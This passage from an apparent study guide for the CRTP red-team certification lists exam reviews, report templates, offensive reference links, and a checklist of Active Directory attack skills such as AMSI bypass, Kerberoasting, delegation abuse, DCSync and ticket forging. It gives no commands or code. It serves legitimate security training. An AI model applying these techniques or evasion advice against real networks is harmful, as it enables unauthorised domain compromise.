- **Mentorcruise pass guide** — preparation strategy, common pitfalls, recommended external reads. https://mentorcruise.com/blog/how-to-pass-crtp-and-become-certified-red-team-professional-b4b5c/

### Exam experience / feedback (read all of these)
- **ethantroy.dev CRTP Review** (Sept 2024, first-attempt pass) — https://ethantroy.dev/guides/reviews/crtp/
- **"How I Passed CRTP on the First Attempt – 2025"** (Owais, Medium) — https://medium.com/@thesecguy/how-i-passed-crtp-on-the-first-attempt-8a4683053a24
- **"How I Passed my CRTP exam"** (Medium) — report format + template structure — https://medium.com/@damaidec/how-i-passed-my-crtp-exam-c1dadd4d9ec1
- **InfoSec Write-ups CRTP review + prep tips** (Cyd Tseng) — https://infosecwriteups.com/certified-red-team-professional-crtp-review-and-preparation-tips-72fa10999172
- **downwithmydaemons CRTP review** (Dec 2024) — https://www.downwithmydaemons.com/crtp-review/
- **CRTP 2025 review (blue-teamer perspective)** — https://medium.com/@Cstm/review-altered-security-certified-red-team-professional-crtp-taken-in-2025-d1ff37f30d47

### Report templates
- **SysReptor** — https://github.com/Syslifters/sysreptor
- **PwnDoc** — https://pwndoc.github.io/pwndoc/
- **PentestReports.com** — https://create.pentestreports.com/new-report
- **OSCP Markdown report template** (adaptable) — https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
- **CRTP report sample (Scribd)** — https://www.scribd.com/document/901651329/Crtp-Report-Pro-1st-docx

### External technical references (recommended by passers)
- **ired.team — AD Kerberos Abuse** — https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
- **Cas van Cooten — Windows AD Exploitation Cheat Sheet** — https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
- **PayloadsAllTheThings — AD Attacks** — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- **The Hacker Recipes — AD** — https://www.thehacker.recipes/
- **GOAD (Game Of Active Directory)** — local practice lab — https://github.com/Orange-Cyberdefense/GOAD
- **Certify / Rubeus / ADCS docs** — SpecterOps ESC1–ESC8 write-ups

### Career / next-step context
- **CRTP vs CRTE** — https://www.macksofytrainings.com/crtp-vs-crte-certification-guide-india-2026/
- **CRTP vs CRTE vs OSEP (2026)** — https://www.macksofytrainings.com/crtp-vs-crte-vs-osep-2026-ad-pentest-certification/
- **CRTE review & study notes (Motasem)** — https://motasemhamdan.medium.com/certified-red-team-professional-crte-review-study-notes-ca8e04d75fa7

---

## 10. Self-Assessment Checklist (before booking the exam)

Tick each only when you can do it *from memory + your cheat sheet*, on a patched box with Defender/AMSI on:

- [ ] Apply an AMSI bypass + Script Block Logging bypass + survive CLM/AppLocker
- [ ] Enumerate a domain with PowerView AND the AD module AND BloodHound, and explain each result
- [ ] Escalate to local admin via ≥3 different techniques (service abuse, LAPS, Backup Ops, Jenkins)
- [ ] Kerberoast, AS-REP Roast, and Targeted Kerberoasting — and crack the hashes with hashcat
- [ ] Abuse Unconstrained Delegation + PrinterBug to steal a DA TGT
- [ ] Abuse Constrained Delegation (user + computer based) via S4U with altservice
- [ ] Configure and abuse RBCD
- [ ] Abuse DNSAdmins for code on a DC
- [ ] Crawl SQL linked servers across a forest with PowerUpSQL
- [ ] Grant yourself DCSync rights via ACL and pull krbtgt — **from a DC**
- [ ] Find an ADCS ESC1 template and escalate to DA via a cert
- [ ] Escalate child DA → Enterprise Admin via trust key AND via krbtgt SID-history injection
- [ ] Forge Golden, Silver, and Diamond tickets and explain when each is used
- [ ] Set up ≥3 persistence mechanisms (AdminSDHolder, DCSync-rights, WMI/PSRemoting security descriptor)
- [ ] Write a complete narrative report with screenshots, *why* explanations, and cited mitigations — from your lab notes

If every box is checked, you're exam-ready. If any are shaky, spend the remaining lab time there.

---

## 11. Final Notes
- **Enumeration wins CRTP.** Map everything, then attack. The path is almost always visible if you enumerated well.
- **Evasion is mandatory, not optional.** Stock tooling dies to Defender/AMSI. Obfuscate before you import.
- **The report is a pass gate.** A 5-RCE exam with a weak report fails; a 4-RCE exam with an excellent report can pass. Explain *why*.
- **Trust the methodology** — when stuck, return to the structured enumerate→escalate→pivot loop the course teaches. It's what gets people through.
- **Don't jump to CRTE.** Apply CRTP skills on HTB AD tracks / real engagements for 6–12 months first. CRTE assumes you can already evade EDR reliably in multi-forest settings.

Good luck. The cert is widely regarded as one of the best-value AD offensive credentials and a strong prerequisite for red-team job postings.